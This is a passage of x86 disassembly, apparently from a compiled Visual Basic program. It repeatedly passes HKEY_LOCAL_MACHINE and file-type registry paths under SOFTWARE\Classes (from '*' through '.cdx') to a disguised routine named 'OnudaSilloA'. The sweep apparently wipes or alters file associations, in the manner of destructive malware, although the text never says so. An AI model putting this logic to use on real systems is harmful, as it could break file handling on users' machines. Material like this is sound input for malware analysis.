  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000008Ah
  push 0041E838h ; "SOFTWARE\Classes\*"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000008Bh
  push 0041E864h ; "SOFTWARE\Classes\.323"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000008Ch
  push 0041E894h ; "SOFTWARE\Classes\.386\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000008Dh
  push 0041E8E8h ; "SOFTWARE\Classes\.386"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000008Eh
  push 0041E918h ; "SOFTWARE\Classes\.3g2"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000008Fh
  push 0041E948h ; "SOFTWARE\Classes\.3gp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000090h
  push 0041E978h ; "SOFTWARE\Classes\.3gpp"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000091h
  push 0041E5FCh ; "SOFTWARE\Classes\.7z"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000092h
  push 0041E9ACh ; "SOFTWARE\Classes\.aac"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000093h
  push 0041E9DCh ; "SOFTWARE\Classes\.ac3"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000094h
  push 0041EA0Ch ; "SOFTWARE\Classes\.aca"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000095h
  push 0041EA3Ch ; "SOFTWARE\Classes\.ace"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000096h
  push 0041EA6Ch ; "SOFTWARE\Classes\.acf"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000097h
  push 0041EA9Ch ; "SOFTWARE\Classes\.acs"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000098h
  push 0041EACCh ; "SOFTWARE\Classes\.acw"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000099h
  push 0041EAFCh ; "SOFTWARE\Classes\.ai"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Ah
  push 0041EB78h ; "SOFTWARE\Classes\.aif\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Bh
  push 0041EBDCh ; "SOFTWARE\Classes\.aif\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Ch
  push 0041EC28h ; "SOFTWARE\Classes\.aif\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Dh
  push 0041EC78h ; "SOFTWARE\Classes\.aif\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Eh
  push 0041ECCCh ; "SOFTWARE\Classes\.aif"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000009Fh
  push 0041ECFCh ; "SOFTWARE\Classes\.aic\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A0h
  push 0041EB2Ch ; "SOFTWARE\Classes\.aic\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A1h
  push 0041ED60h ; "SOFTWARE\Classes\.aic\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A2h
  push 0041EDB0h ; "SOFTWARE\Classes\.aic\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A3h
  push 0041EE04h ; "SOFTWARE\Classes\.aic"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A4h
  push 0041EE34h ; "SOFTWARE\Classes\.amr"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A5h
  push 0041EE64h ; "SOFTWARE\Classes\.aiff\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A6h
  push 0041EECCh ; "SOFTWARE\Classes\.aiff\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A7h
  push 0041EF18h ; "SOFTWARE\Classes\.aiff\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A8h
  push 0041EF6Ch ; "SOFTWARE\Classes\.aiff\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000A9h
  push 0041EFC4h ; "SOFTWARE\Classes\.aiff"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000AAh
  push 0041EFF8h ; "SOFTWARE\Classes\.ani"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000ABh
  push 0041F028h ; "SOFTWARE\Classes\.ape"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000ACh
  push 0041F058h ; "SOFTWARE\Classes\.aps\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000ADh
  push 0041F0ACh ; "SOFTWARE\Classes\.aps"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000AEh
  push 0041F0DCh ; "SOFTWARE\Classes\.arj"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000AFh
  push 0041F10Ch ; "SOFTWARE\Classes\.asa"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B0h
  push 0041F13Ch ; "SOFTWARE\Classes\.ascx\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B1h
  push 0041F194h ; "SOFTWARE\Classes\.ascx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B2h
  push 0041F1C8h ; "SOFTWARE\Classes\.asf\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B3h
  push 0041F22Ch ; "SOFTWARE\Classes\.asf\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B4h
  push 0041F2A8h ; "SOFTWARE\Classes\.asf\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B5h
  push 0041F2F8h ; "SOFTWARE\Classes\.asf\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B6h
  push 0041F34Ch ; "SOFTWARE\Classes\.asf\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B7h
  push 0041F3DCh ; "SOFTWARE\Classes\.asf\ShellEx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B8h
  push 0041F41Ch ; "SOFTWARE\Classes\.asm\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000B9h
  push 0041F278h ; "SOFTWARE\Classes\.asm"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000BAh
  push 0041F470h ; "SOFTWARE\Classes\.asmx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000BBh
  push 0041F4A4h ; "SOFTWARE\Classes\.asp\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000BCh
  push 0041F4F8h ; "SOFTWARE\Classes\.asp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000BDh
  push 0041F528h ; "SOFTWARE\Classes\.aspx\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000BEh
  push 0041F580h ; "SOFTWARE\Classes\.aspx"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000BFh
  push 0041F5B4h ; "SOFTWARE\Classes\.asx\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C0h
  push 0041F648h ; "SOFTWARE\Classes\.asx\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C1h
  push 0041F694h ; "SOFTWARE\Classes\.asx\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C2h
  push 0041F6E4h ; "SOFTWARE\Classes\.asx\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C3h
  push 0041F738h ; "SOFTWARE\Classes\.asx\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C4h
  push 0041F7C8h ; "SOFTWARE\Classes\.asx\ShellEx"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C5h
  push 0041F618h ; "SOFTWARE\Classes\.asx"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C6h
  push 0041F808h ; "SOFTWARE\Classes\.au\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C7h
  push 0041F86Ch ; "SOFTWARE\Classes\.au\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C8h
  push 0041F8B4h ; "SOFTWARE\Classes\.au\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000C9h
  push 0041F904h ; "SOFTWARE\Classes\.au\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000CAh
  push 0041F958h ; "SOFTWARE\Classes\.au"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000CBh
  push 0041F988h ; "SOFTWARE\Classes\.AudioCD\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000CCh
  push 0041F9E4h ; "SOFTWARE\Classes\.AudioCD"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000CDh
  push 0041FA1Ch ; "SOFTWARE\Classes\.avi\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000CEh
  push 0041FA80h ; "SOFTWARE\Classes\.avi\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000CFh
  push 0041FACCh ; "SOFTWARE\Classes\.avi\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D0h
  push 0041FB1Ch ; "SOFTWARE\Classes\.avi\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D1h
  push 0041FBC0h ; "SOFTWARE\Classes\.avi\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D2h
  push 0041FC50h ; "SOFTWARE\Classes\.avi\ShellEx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D3h
  push 0041FC90h ; "SOFTWARE\Classes\.avi"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D4h
  push 0041FCC0h ; "SOFTWARE\Classes\.awb"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D5h
  push 0041FCF0h ; "SOFTWARE\Classes\.bas"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D6h
  push 0041FD20h ; "SOFTWARE\Classes\.bat\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D7h
  push 0041FD74h ; "SOFTWARE\Classes\.bat"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D8h
  push 0041FB70h ; "SOFTWARE\Classes\.bfc\ShellNew\Config"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000D9h
  push 0041FDA4h ; "SOFTWARE\Classes\.bfc\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000DAh
  push 0041FDE8h ; "SOFTWARE\Classes\.bfc"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000DBh
  push 0041FE18h ; "SOFTWARE\Classes\.bin\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000DCh
  push 0041FE6Ch ; "SOFTWARE\Classes\.bin"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000DDh
  push 0041FE9Ch ; "SOFTWARE\Classes\.bkf\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000DEh
  push 0041FEF0h ; "SOFTWARE\Classes\.bkf"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000DFh
  push 0041FF20h ; "SOFTWARE\Classes\.blg"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E0h
  push 0041FF84h ; "SOFTWARE\Classes\.bmp\OpenWithList\MSPaint.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E1h
  push 0041FFE8h ; "SOFTWARE\Classes\.bmp\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E2h
  push 00420034h ; "SOFTWARE\Classes\.bmp\OpenWithProgids"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E3h
  push 00420084h ; "SOFTWARE\Classes\.bmp\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E4h
  push 004200D8h ; "SOFTWARE\Classes\.bmp\ShellNew"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E5h
  push 0042011Ch ; "SOFTWARE\Classes\.bmp"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E6h
  push 0041FF50h ; "SOFTWARE\Classes\.bpg"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E7h
  push 0042014Ch ; "SOFTWARE\Classes\.bsc\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E8h
  push 004201A0h ; "SOFTWARE\Classes\.bsc"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000E9h
  push 004201D0h ; "SOFTWARE\Classes\.bz"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000EAh
  push 00420200h ; "SOFTWARE\Classes\.bz2"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000EBh
  push 00420230h ; "SOFTWARE\Classes\.c\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000ECh
  push 00420280h ; "SOFTWARE\Classes\.c"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000EDh
  push 004202ACh ; "SOFTWARE\Classes\.cab\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000EEh
  push 0042032Ch ; "SOFTWARE\Classes\.cab"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000EFh
  push 0042035Ch ; "SOFTWARE\Classes\.cat"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F0h
  push 0042038Ch ; "SOFTWARE\Classes\.cda\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F1h
  push 004203F0h ; "SOFTWARE\Classes\.cda\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F2h
  push 0042043Ch ; "SOFTWARE\Classes\.cda\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F3h
  push 0042048Ch ; "SOFTWARE\Classes\.cda\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F4h
  push 004204E0h ; "SOFTWARE\Classes\.cda"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F5h
  push 00420510h ; "SOFTWARE\Classes\.cdf"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F6h
  push 00420540h ; "SOFTWARE\Classes\.cdx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000000F7h
